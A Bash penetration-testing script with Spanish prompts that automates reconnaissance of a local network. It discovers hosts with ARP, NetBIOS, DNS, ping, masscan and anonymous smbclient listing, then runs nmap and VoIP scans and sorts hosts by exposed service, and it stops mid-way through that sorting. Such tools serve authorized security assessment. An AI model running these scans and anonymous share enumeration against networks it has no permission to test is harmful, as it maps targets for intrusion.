#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org
##
# Identificar backdoors (archivos conocidos, expresiones regulares)
# Adicionar struts check
# cracker.sh admin/admin  wordpress,joomla,drupal
# PoC Suite3
# https://medium.com/tenable-techblog/gpon-home-gateway-rce-threatens-tens-of-thousands-users-c4a17fd25b97
# Identificar redes con  http://www.ip-calc.com/
##

OKBLUE='\033[94m'
OKRED='\033[91m'
OKYELLOW="\033[0;33m" 
OKGREEN='\033[92m'
RESET='\e[0m'	


################## Config HERE ####################
#netA="10.0.X.0/24";
netA="10.10.X.0/24";
netB="172.16.X.0/24";
netC="192.168.X.0/24";
#netC="192.168.X.0/24";
max_nmap_ins=5;
max_web_ins=10;
port_scan_num=2;
min_ram=500;
#############################

live_hosts=".datos/total-host-vivos.txt"
arp_list=".datos/lista-arp.txt"
smb_list=".escaneos/lista-smb.txt"
dns_list=".escaneos/lista-dns.txt"
mass_scan_list=".escaneos/lista-mass-scan.txt"
ping_list=".escaneos/lista-ping.txt"
smbclient_list=".escaneos/lista-smbclient.txt"
port_scan_num="n"
prefijo=""


function print_ascii_art {
cat << "EOF"
   __               __                                 
  / /  __ _ _ __   / _\ ___ __ _ _ __  _ __   ___ _ __ 
 / /  / _` | '_ \  \ \ / __/ _` | '_ \| '_ \ / _ \ '__|
/ /__| (_| | | | | _\ \ (_| (_| | | | | | | |  __/ |   
\____/\__,_|_| |_| \__/\___\__,_|_| |_|_| |_|\___|_|   
                                                       

					daniel.torres@owasp.org
					https://github.com/DanielTorres1

EOF
}

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}
	
print_ascii_art


while getopts ":t:a:s:d:o:" OPTIONS
do
            case $OPTIONS in
            t)     TYPE=$OPTARG;;
            s)     SUBNET_FILE=$OPTARG;;
            a)     FILE=$OPTARG;;
            d)     DOMAIN=$OPTARG;;
            o)     OFFSEC=$OPTARG;;
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

TYPE=${TYPE:=NULL}
SUBNET_FILE=${SUBNET_FILE:=NULL}
FILE=${FILE:=NULL}
DOMAIN=${DOMAIN:=NULL}
OFFSEC=${OFFSEC:=NULL}

#if [ $TYPE = NULL ] ; then
#if [[ $TYPE == NULL] || [ $DOMAIN == NULL ]]; then
if [ "$TYPE" = NULL ] || [ "$DOMAIN" = NULL ]; then

cat << "EOF"

Opciones: 

-t : Tipo de escaneo [completo/parcial]
-d : dominio

Definicion del alcance (opcional):
	-s : Lista con las subredes a escanear (Formato CIDR 0.0.0.0/24)
	-f : Lista con las IP a escanear

Ejemplo 1: Escanear la red local (completo)
	lanscanner.sh -t completo -d ejemplo.com

Ejemplo 2: Escanear el listado de IPs (completo)
	lanscanner.sh -t completo -a lista.txt -d ejemplo.com

Ejemplo 3: Escanear el listadado de subredes (completo)
	lanscanner.sh -t completo -s subredes.txt -d ejemplo.com
EOF

exit
fi
######################

if [[ $TYPE == "completo" ]] || [ $TYPE == "parcial" ]; then


echo -e "\n\n$OKYELLOW ########### Configurando los parametros ############## $RESET"

if [ ! -d ".servicios" ]; then # si ya ejecutamos recon.sh antes

  echo -e "$OKBLUE Cual es el nombre del proyecto? $RESET"
  read project

  mkdir $project
  cd $project
  prefijo="../"


	mkdir .arp
	mkdir .escaneos
	mkdir .datos
	mkdir .nmap
	mkdir .nmap_1000p
	mkdir .nmap_banners
	mkdir .enumeracion
	mkdir .vulnerabilidades
	mkdir .enumeracion2 
	mkdir .vulnerabilidades2 
	mkdir .masscan
	mkdir reportes
	mkdir archivos
	mkdir webClone
	mkdir metasploit
	mkdir credenciales
	mkdir .servicios
	mkdir .tmp
	mkdir -p logs/cracking
	mkdir -p logs/enumeracion
	mkdir -p logs/vulnerabilidades
	
	cp /usr/share/lanscanner/resultados.db .
fi

touch $smb_list 
touch $smbclient_list
touch $mass_scan_list 
touch $ping_list


echo -e "$OKBLUE Que interfaz usaremos? eth0,tap0, etc ?$RESET"
read iface

my_ip=`ifconfig $iface | grep -i mask | awk '{print $2}' | sed 's/addr://g' `
my_mac=`ifconfig $iface | grep ether | awk '{print $2}'`

if [ -z "$my_mac" ]
then
      my_mac=`ifconfig $iface | grep HWaddr | awk '{print $5}'`
fi

my_route=`route -n | grep UG | awk '{print $2}'`
date=`date`
current_ip=`ifconfig $iface | grep netmask | awk '{print $2}'`
current_subnet=`ifconfig $iface | grep -i mask | awk '{print $2}' | cut -d . -f 1-3`
dns=`grep --color=never nameserver /etc/resolv.conf`

rm  reportes/info.txt 2>/dev/null
echo -e "Datos del escaneo:" | tee -a reportes/info.txt
echo -e "\t IP Origen: $my_ip " | tee -a reportes/info.txt
echo -e "\t MAC : $my_mac" | tee -a reportes/info.txt
echo -e "\t Gateway: $my_route " | tee -a reportes/info.txt
echo -e "\t DNS: $dns " | tee -a reportes/info.txt
echo -e "\t Subnet: $current_subnet.0/24 " | tee -a reportes/info.txt
echo -e "\t Date: $date  \n" | tee -a reportes/info.txt

  
echo -e "[+] Lanzando monitor $RESET" 
xterm -hold -e monitor.sh 2>/dev/null&
sleep 5

# Using ip list    
  if [ $FILE != NULL ] ; then        
     echo -e  "[+] Usando  archivo : $FILE " 
     if [ ! -f $prefijo$FILE ]; then
		echo -e  "$OKRED El archivo no existe ! $RESET" 		
		exit
	 fi	
     
     cat $prefijo$FILE | cut -d "," -f 1 | sort | uniq > $live_hosts    
    
    ####### descubrir mas host con smbclient  #
   #echo -e "$OKBLUE ¿Realizaremos escaneo con smbclient para descubrir mas host? s/n (Recomendado para LAN) $RESET"
   #read smbclient

   #if [ $smbclient == 's' ]
   #then     
	#	echo -e "[+] Buscando mas host vivos con smbclient" 
		#for ip in `cat $live_hosts`;			
		#do 		
			#smbclient -L $ip -U "%"  | egrep -vi "comment|---|master|Error|reconnecting|failed" | awk '{print $1}' | tee -a .escaneos/smbclient.txt 2>/dev/null
		#done
		#cat .escaneos/smbclient.txt | sort | sort | uniq > .escaneos/smbclient2.txt

		#for hostname in `cat .escaneos/smbclient2.txt`;
		#do 			
			#host $hostname | grep "has address" | cut -d " " -f 4 >> $smbclient_list
		#done
		
		#cat $prefijo$FILE $smbclient_list | cut -d "," -f 2 | sort | sort | uniq > $live_hosts # join file + smbclient_lis		
		#cat $live_hosts
		#echo -e "\t"       
		#echo -e  " ################################" 	
   #fi   
   #cat $live_hosts | cut -d . -f 1-3 | sort | sort | uniq > .datos/subnets.txt # get subnets      
	##################
    
  else

# FASE: 1
#######################################  Discover live hosts ##################################### 
  
  echo -e "[+] Buscar host vivos en otras redes usando ICMP,SMB,TCP21,22,80,443 \n" 
  echo -e "$OKYELLOW [+] FASE 1: DESCUBRIR HOST VIVOS $RESET"

  ######## ARP ########
  echo -e "[+] Obteniendo host vivos locales"
  arp-scan $iface $current_ip/24  | tee -a .arp/$current_subnet.0.arp2 2>/dev/null
  sleep 2
  arp-scan $iface $current_ip/24  | tee -a .arp/$current_subnet.0.arp2 2>/dev/null  
  
  sort .arp/$current_subnet.0.arp2 | sort | uniq > .arp/$current_subnet.0.arp
  rm .arp/$current_subnet.0.arp2
  echo -e "\t \n"
  
  	# ARP
  for ip_list in $(ls .arp | egrep -v "all|done"); do      
      cat .arp/$ip_list | egrep -v "DUP|packets" | grep ^1 | awk '{print $1}' | sort >> $arp_list
      mv .arp/$ip_list .arp/$ip_list.done	
   done;  
  #######################  
  
 if [ $SUBNET_FILE = NULL ] ; then
	echo -e "$OKBLUE Definir el numero de redes a escanear en busca de hosts vivos $RESET"    
	echo -e "$OKYELLOW\t Ej:  Si escribe $OKRED 20$OKYELLOW se escaneara las redes :"  
	#echo -e "10.0$OKRED.1-20$OKYELLOW.0/24  \n192.168$OKRED.1-20$OKYELLOW.0/24  \n172.16$OKRED.1-20$OKYELLOW.0/24  $RESET"   
	net1="${netA/.X/$OKRED.1-20$OKYELLOW}"
	net2="${netB/.X/$OKRED.1-20$OKYELLOW}"
	net3="${netC/.X/$OKRED.1-20$OKYELLOW}"
	echo -e $net1
	echo -e $net2
	echo -e $net3
  
  
	echo -e "$OKBLUE Que redes escanear ? $RESET"
	read num_nets_enum     
  fi
  
	  	  
	echo -e "$OKBLUE Realizar escaneo de puertos 22,80,443 en busca de mas hosts vivos ? s/n $RESET"	  
	read adminports
	  
	echo -e "$OKBLUE Realizar escaneo ICMP (ping) en busca de mas hosts vivos ? (Mas lento aun ...) s/n $RESET"	  
	read pingscan	 

	    	  	 
	  	  	 	
	  #################################   SMB    ####################
	  echo -e "##### Realizando escaneo SMB en busca de mas hosts vivos #####"	  
	  
	  if [ $SUBNET_FILE != NULL ] ; then	  	 
		for subnet in `cat $prefijo$SUBNET_FILE`;
		do 
			echo -e "\t[+] Escaneando: $subnet "
			nbtscan $subnet | tee -a .escaneos/escaneo-smb.txt
		done
		
	  else
		# escaneo a redes definidas por el usuario
		smb-scan.pl $netA $netB $netC $num_nets_enum | tee -a .escaneos/escaneo-smb.txt		
	  fi
	  
	  cat .escaneos/escaneo-smb.txt | grep : | awk '{print $1}' | grep --color=never ^1 > $smb_list 2>/dev/null	  
      
                                   
      echo -e  " #######################################################" 
      echo -e  "$OKYELLOW Con el escaneo SMB  encontramos estos hosts vivos: $RESET" 
      cat $smb_list
      echo -e "\t"      
      #######################################
      
      
      #################################   DNS    ####################

	  
	  if [ $SUBNET_FILE != NULL ] ; then	
   	 	echo -e "##### Realizando escaneo DNS en busca de mas hosts vivos #####"	  
  	 
		for subnet in `cat $prefijo$SUBNET_FILE`;
		do 
			echo -e "\t[+] Escaneado $subnet "
			dnsrecon -r $subnet | tee -a .escaneos/escaneo-dns.txt
		done

	  	#cat .escaneos/escaneo-dns.txt | grep : | awk '{print $1}' > $smb_list 2>/dev/null	  
		grep PTR .escaneos/escaneo-dns.txt 2>/dev/null| awk '{print $4}' | grep --color=never ^1 > $dns_list 2>/dev/null			  

                                   
	      echo -e  " #######################################################" 
	      echo -e  "$OKYELLOW Con el escaneo DNS  encontramos estos hosts vivos: $RESET" 
	      cat $dns_list
	      echo -e "\t"      
	      #######################################
	  fi
	  
           
      
      #################################   PORT 23,80,443,22  escaneando ##################
	  
	  if [ $adminports == 's' ]
      then 
		echo -e "$OKBLUE ##### Realizando escaneo al puerto 22,80,443 en busca de mas hosts vivos ##### $RESET"	  
      
		if [ $SUBNET_FILE != NULL ] ; then	  	 
			for subnet in `cat $prefijo$SUBNET_FILE`;
			do 
				echo -e "\t[+] Escaneando: $subnet "
				masscan -p21,22,23,80,443,445 --rate=150 $subnet | tee -a .escaneos/mass-scan.txt
			done		
		else
				mass-scan.pl $netA $netB $netC .escaneos/mass-scan.txt
		fi
	               
		
		cat .escaneos/mass-scan.txt | cut -d " " -f 6 | sort | uniq | grep --color=never ^1 > $mass_scan_list 2>/dev/null

		echo -e  " #######################################################" 
		echo -e  "$OKRED Encontramos estos hosts vivos: $RESET" 
		cat $mass_scan_list
		echo -e "\t"             
      fi  	  	  
      
      #######################################
	  
	  
	  
	   #################################   ICMP escaneando   ####################
	  
	  if [ $pingscan == 's' ]
      then 
		echo -e "$OKBLUE ##### Realizando escaneo ping en busca de mas hosts vivos ##### $RESET"	  
		
		if [ $SUBNET_FILE != NULL ] ; then	  	 
			for subnet in `cat $prefijo$SUBNET_FILE`;
			do 
				echo -e "[+] Escaneando: $subnet "
				fping -a -g $subnet | tee -a .escaneos/escaneo-ping.txt 
			done		
		else
				ping-scan.pl $netA $netB $netC $num_nets_enum | tee -a .escaneos/escaneo-ping.txt 
		fi
		
        
        cat .escaneos/escaneo-ping.txt | grep -v Escaneando  | sort | sort | uniq | grep --color=never ^1 > $ping_list 2>/dev/null
        
        echo -e  " #######################################################" 
        echo -e  "$OKYELLOW Con el escaneo ICMP (ping) encontramos estos hosts vivos: $RESET" 
        cat $ping_list
        echo -e "\t"       
      fi        
	  #######################################
	           
    #fi #if scan_type
      #################################   smbclient   ####################
	  
	   ####### smbclient scan #
    echo -e "$OKBLUE ¿Realizaremos escaneo con smbclient para descubrir mas host? s/n (Recomendado para LAN) $RESET"
	read smbclient

    if [ $smbclient == 's' ]
   then     
		
		echo -e "##### Realizando escaneo smclient en busca de mas hosts vivos #####"	  
		
		######## preliminar join arp + ping +smb + mass scan + DNS to review more hosts
		cat $dns_list $smb_list $mass_scan_list $ping_list $arp_list 2>/dev/null | sort | sort | uniq > $live_hosts #2>/dev/null 
		sed -i '/^\s*$/d' $live_hosts # delete empty lines	          
		##################  
     
		for ip in `cat $live_hosts`;			
		do 		
			smbclient -L $ip -U "%"  | egrep -vi "comment|---|master|Error|reconnecting|failed" | awk '{print $1}' >> .escaneos/smbclient.txt 2>/dev/null
		done
		cat .escaneos/smbclient.txt | sort | uniq | sort > .escaneos/smbclient2.txt

		for hostname in `cat .escaneos/smbclient2.txt`;
		do 			
			host $hostname | grep "has address" | cut -d " " -f 4 >> $smbclient_list
		done
				
        
        echo -e  " #######################################################" 
        echo -e  "$OKYELLOW Con el escaneo de smbclient encontramos estos hosts vivos: $RESET" 
        cat $smbclient_list
        echo -e "\t"             
	  ####################################### 
	
   fi   
	##################
	

    
    echo -e  " #######################################################" 
    ############ Generando lista ###########
   
    
     ######## Final join arp + ping +smb + mass scan + DNS + smbclient
	 cat $dns_list $smb_list $mass_scan_list $ping_list $arp_list $smbclient_list 2>/dev/null | sort | sort | uniq > $live_hosts #2>/dev/null 
	 sed -i '/^\s*$/d' $live_hosts # delete empty lines	          
     ##################     
        
     echo -e "Revisar si hay host que no debemos escanear ($live_hosts). Presionar ENTER para continuar"
     read n	    	       
	  
	  echo -e  " #######################################################" 
      echo -e  "[i] TOTAL HOST VIVOS ENCONTRADOS:" 
      echo -e "\t"                  
 fi # if FILE
 
 # generate subnets 
 cat $live_hosts | cut -d . -f 1-3 | sort | uniq > .datos/subnets.txt

###### #check host number########
total_hosts=`wc -l .datos/total-host-vivos.txt | sed 's/.datos\/total-host-vivos.txt//g' `
echo -e  "TOTAL HOST VIVOS ENCONTRADOS: $total_hosts hosts" 
cat $live_hosts

#if [ $total_hosts -gt 490 ] ; then	  	 
	#echo -e "\tMuchos hosts. Dividir el archivo .datos/total-host-vivos.txt y volver a ejecutar lanscanner"	
	#echo -e "\tlanscanner.sh -t completo -f lista.txt"
	#exit
#fi
#################################  

################## end discover live hosts ##################



# FASE: 2
echo -e "$OKYELLOW [+] FASE 2: ESCANEO DE PUERTOS,VoIP, etc $RESET"
################## Escanear (voip,smb,ports,etc) ##################
echo -e "############# Escaneando #################\n"

echo -e "$OKBLUE Proceder con el escaneo? ENTER $RESET"
read enter

echo -e "$OKBLUE ¿Estamos escaneado IPs publicas? s/n $RESET"	  
read internet
      
########### searching VoIP devices ##########
if [ $internet == "n" ]; then 	

  if [ $TYPE = "parcial" ] ; then 	
	echo -e "$OKBLUE Realizar escaneo VoIP ? s/n $RESET"
    read resp_voip
  fi
  
 #if [[ ( ${TYPE} == "completo" || ${resp_voip} == "s" ) && (${FILE} = NULL )]];then 
  if [[ ${TYPE} == "completo" || ${resp_voip} == "s" ]];then 
	echo -e "#################### Buscando dispositivos VoIP: ######################"	  
	
	for subnet in $(cat .datos/subnets.txt); do
	  echo -e "[+] Escaneando $subnet.0/24"	  
	  svmap $subnet".0/24" > .enumeracion/$subnet-voip.txt 2>/dev/null 
    done;	
  fi
fi  
 #####################
  
 
  
   
	
#####################
  
  
  ########### shared resource escaneando ##########
 if [ $TYPE = "parcial" ] ; then
	echo -e "$OKBLUE ¿Buscar recursos compartidos?: s/n $RESET"	
    read resp_shared
  fi
  
 
   
if [[ $TYPE = "completo" ]] || [ $tcp_escaneando == "s" ]; then 
	echo -e "#################### Escaneo de puertos TCP ######################"	  
	
	if [ $TYPE == 'completo' ]        	    
	then
		port_scan_num=2
		if [ $total_hosts -gt 200 ]
		then
			max_nmap_ins=15
		else
			max_nmap_ins2=`echo "$total_hosts/15 + 1" | bc -l`
			max_nmap_ins=`echo $max_nmap_ins2 | awk '{print int($1+0.5)}'`	# redondeado
		fi	
		echo -e "$OKBLUE [+]Escaneado los 1000 puertos mas usados $RESET"
		echo -e "$OKBLUE [+]Número máximo de instancias de nmap: $max_nmap_ins $RESET"	
	else
		echo -e "$OKBLUE Configurar escaneo de puertos TCP: $RESET"
		echo -e "\t Opcion 1: Solo puertos WEB (80,3306,etc):"
		echo -e "\t Opcion 2: Los 1000 puertos mas usados: "
		echo -e "\t Opcion 3: Los 65535 puertos:"
		echo -e "$OKBLUE Escribe el numero de la opcion: $RESET"	
		read port_scan_num
			
		echo -e "$OKBLUE ¿Cuantas instancias de nmap permitiremos (1-15)? $RESET"
		read max_nmap_ins  
	fi
	

	
	if [ $port_scan_num == '1' ]        	    
	then
     	echo -e "[+] Realizando escaneo de puertos especificos (Web, SSH, Telnet,SMB, etc)"  
     	nmap -n -iL $live_hosts -sV -p21,22,23,25,53,80,110,139,143,443,445,993,995,1433,1521,3306,3389,8080 -oG .nmap/nmap-tcp.grep >> reportes/nmap-tcp.txt 2>/dev/null     	     	
     fi	
     
     
     if [ $port_scan_num == '2' ]   
     then   	
     	echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  
     	nmap -n -Pn -iL $live_hosts -p21,22,23,110,80,443,8080,81,32764,82,83,84,85,37777,5432,3306,1525,1530,1526,1433,8728,1521,6379,623,27017,8291 -oG .nmap/nmap2-tcp.grep >> reportes/nmap-tcp.txt 2>/dev/null       	
     	sleep 2;        			
			
     	echo -e "[+] Realizando escaneo tcp (solo 1000 puertos)" 
     	while read ip           
		do    			
			nmap_instancias=$((`ps aux | grep nmap | wc -l` - 1)) 
			#echo -e "\tinstancias de nmap ($nmap_instancias)"
			if [ "$nmap_instancias" -lt $max_nmap_ins ] #Max 5 instances
				then
					#echo -e "\tnmap $ip"
					nmap -n -Pn $ip -oG .nmap_1000p/$ip-tcp.grep > .nmap_1000p/$ip-tcp.txt 2>/dev/null &					
					sleep 0.2;	
				else				
					while true; do
						echo -e "\tMax instancias de nmap ($nmap_instancias)"
						sleep 10;
						nmap_instancias=$((`ps aux | grep nmap | wc -l` - 1)) 
						if [ "$nmap_instancias" -lt $max_nmap_ins ] #Max 5 instances
						then
							nmap -n -Pn $ip -oG .nmap_1000p/$ip-tcp.grep > .nmap_1000p/$ip-tcp.txt 2>/dev/null &
							break
						fi							
					done														
			 fi		
			 #echo -e "\t[+] Done $ip"
		done <$live_hosts
     	
     	#nmap -n -iL $live_hosts -sV -oG .nmap/nmap1-tcp.grep > reportes/nmap-tcp.txt 2>/dev/null       	
     	
     	while true; do
		nmap_instancias=`pgrep nmap | wc -l`			
						
		if [ "$nmap_instancias" -gt 0  ];then	
			echo -e "\t[i] Todavia hay escaneos de nmap ($nmap_instancias) activos"  
			sleep 20
		else
			break		  		 
		fi				
		done	
     	
     	cat .nmap_1000p/*.grep > .nmap/nmap1-tcp.grep 
     	cat .nmap_1000p/*.txt  >reportes/nmap-tcp.txt
     	
     	cat .nmap/nmap1-tcp.grep .nmap/nmap2-tcp.grep > .nmap/nmap-tcp.grep # join nmap scans
     	rm .nmap/nmap1-tcp.grep .nmap/nmap2-tcp.grep           
     fi	
     
     
			
	if [ $port_scan_num == '3' ]
    then    			
		for ip in $( cat $live_hosts  ); do        
			echo -e "[+] Escaneando todos los puertos de $ip con mass-escaneando (TCP)"   		
			masscan -p1-65535 --rate 700 $ip --output-format grepable --output-filename .masscan/$ip.tcp 2>/dev/null ;
			ports=`cat .masscan/$ip.tcp  | grep -o "[0-9][0-9]*/open" | tr '\n' ',	' | tr -d '/open'`		
			num_ports=`echo $ports | tr -cd ',' | wc -c`		

			if [ "$num_ports" -gt 35 ]
			then
				echo -e "\tSospechoso!!. Muchos puertos abiertos ($num_ports)"
			else				
				echo -e "[+] Identificando servicios de $ip ($ports)"
				nmap -n -sV -O -p $ports $ip -oG .escaneos/$ip-tcp.grep2 >> reportes/nmap-tcp.txt 2>/dev/null &						
			fi					                            			
        done 
        
        cat .escaneos/*.grep2 > .nmap/nmap-tcp.grep       
                       
     fi      
     	
 fi 
    

################### TCP/UDP escaneo  ###################
 if [ $TYPE = "parcial" ] ; then	
	echo -e "\n$OKBLUE Realizar escaneo de puertos UDP?: s/n $RESET"
    read udp_scan
 fi

 if [ $TYPE = "parcial" ] ; then	
	echo -e "\n$OKBLUE Realizar escaneo de puertos TCP?: s/n $RESET"
    read tcp_scan
  fi
   

 if [[ $TYPE = "completo" ]] || [ $udp_escaneando == "s" ]; then 	
    echo -e "#################### Escaneo de puertos UDP ######################"	  
       
		
	nmap -n -sU -p 53,161,500,67,1604,1900  -iL $live_hosts -oG .nmap/nmap-udp.grep > reportes/nmap-udp.txt 2>/dev/null 
		
	
	if [ $internet == "n" ]; then 	
	
		for subnet in $(cat .datos/subnets.txt); do
			echo -e "[+] Escaneando $subnet.0/24"	  
			masscan --interface $iface -pU:161 $subnet".0/24" | grep --color=never -i Discovered  > .masscan/$subnet-snmp.txt 2>/dev/null 
			masscan --interface $iface -pU:500 $subnet".0/24" | grep --color=never -i Discovered  > .masscan/$subnet-vpn.txt 2>/dev/null 						
		done;    
    fi	
	
	echo -e "\t"			
 fi	      
    
########## making reportes #######
if [[ $TYPE == "completo"  || $tcp_escaneando == "s"   || $udp_escaneando == "s" ]] ; then 
	echo -e "[+] Creando reporte nmap"
	# clean tcp wrapped
	
	#if [[ $TYPE = "completo" ]] || [ $tcp_escaneando == "s" ]; then 
	#	cd reportes
	#	cat nmap-tcp2.txt | grep -v tcpwrapped > nmap-tcp.txt    
	#	rm nmap-tcp2.txt
	#	cd ..
	#fi
	
		
	# replace IP with subdominio
	#cat nmap-tcp.grep  | grep -v "Status: Up" >nmap-tcp.grep
	#rm nmap-tcp.grep
	#for dominio in `grep "Nmap escaneando reportes for" nmap-tcp.txt | cut -d " " -f 5`
	#do	   	             
		# echo -e "\tdominio $dominio"			
		#sed -i "1,/[0-9]\{2,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}/s/[0-9]\{2,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}/$dominio/g" nmap-tcp.grep
	#done	  
	#### generar reporte nmap ######   
	cd .nmap
	report-open-ports.pl -l ../$live_hosts -t nmap-tcp.grep -u nmap-udp.grep
	cd ../
fi
###################  
  
################### Ordernar IPs por servicio ###################
if [[ $TYPE = "completo" ]] || [ $tcp_escaneando == "s" ]; then 
	cd .nmap	
					
	grep '/rtsp/' nmap-tcp.grep | grep --color=never -o -P '(?<=Host: ).*(?=\(\))'>../.servicios/camaras-ip.txt
	grep '/http-proxy/' nmap-tcp.grep | grep --color=never -o -P '(?<=Host: ).*(?=\(\))'>../.servicios/proxy-http.txt
	
	
	#web
	grep " 80/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:80\n"' | sort | uniq > ../.servicios/web.txt	
	grep " 81/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:81\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 82/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:82\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 83/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:83\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 84/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:84\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 85/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:85\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 86/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:86\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 87/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:87\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 88/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:88\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 89/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:89\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 8080/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8080\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 8081/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8081\n"' | sort | uniq >> ../.servicios/web.txt	
	grep " 8010/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8010\n"' | sort | uniq >> ../.servicios/web.txt		
	grep " 8800/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8800\n"' | sort | uniq >> ../.servicios/web.txt		
	
	
	# web-ssl
	grep " 443/open" nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:443\n"' | sort | uniq > ../.servicios/web-ssl.txt
	grep " 8443/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8443\n"' | sort | uniq >> ../.servicios/web-ssl.txt
	grep " 4443/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4443\n"' | sort | uniq >> ../.servicios/web-ssl.txt
	grep " 4433/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4433\n"' | sort | uniq >> ../.servicios/web-ssl.txt	
		
	grep ' 21/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:21\n"' | sort | uniq >> ../.servicios/ftp.txt
	grep ' 513/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:513\n"' | sort | uniq >> ../.servicios/rlogin.txt
	## ssh																	del newline       add port
	grep ' 22/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:22\n"' | sort | uniq >> ../.servicios/ssh.txt
	grep ' 6001/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6001\n"' | sort | uniq >> ../.servicios/ssh.txt
	grep ' 23/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:23\n"' | sort | uniq >> ../.servicios/telnet.txt
	
	## MAIL																	del newline       add port
	grep ' 25/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:25\n"' | sort | uniq >> ../.servicios/smtp.txt
	grep ' 587/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:587\n"' | sort | uniq >> ../.servicios/smtp.txt
	grep ' 465/open' nmap-tcp.grep | awk '{print $2}'| perl -ne '$_ =~ s/\n//g; print "$_:465\n"'  | sort | uniq >> ../.servicios/smtp.txt	
	grep ' 110/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:110\n"' | sort | uniq >> ../.servicios/pop.txt 
	grep ' 143/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:143\n"' | sort | uniq >> ../.servicios/imap.txt 
	grep ' 10000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:10000\n"' | sort | uniq >> ../.servicios/webmin.txt 
	grep ' 111/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:111\n"' | sort | uniq >> ../.servicios/rpc.txt 
	grep ' 106/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:106\n"' | sort | uniq >> ../.servicios/pop3pw.txt 
  
	## ldap																	del newline       add port
	grep ' 389/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:389\n"' | sort | uniq >> ../.servicios/ldap.txt
	grep ' 636/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:636\n"' | sort | uniq >> ../.servicios/ldaps.txt
  
  
	### SMB 														   del newline       add port
	grep ' 445/open' nmap-tcp.grep | awk '{print $2}' | sort | uniq >> ../.servicios/smb2.txt
	grep ' 139/open' nmap-tcp.grep | awk '{print $2}' | sort | uniq >> ../.servicios/smb2.txt
	sort ../.servicios/smb2.txt | sort | uniq > ../.servicios/smb.txt;rm ../.servicios/smb2.txt
	grep ' 139/open' nmap-tcp.grep | awk '{print $2}' >> ../.servicios/smb-139.txt
			

    
	# Java related
	grep ' 8009/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8009\n"' | sort | uniq >> ../.servicios/java.txt
	grep ' 9001/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9001\n"' | sort | uniq >> ../.servicios/java.txt
			# database ports 														   del newline       add port
	grep ' 1525/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1525\n"' | sort | sort | uniq >> ../.servicios/informix.txt
	grep ' 1530/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1530\n"' | sort | sort | uniq >> ../.servicios/informix.txt
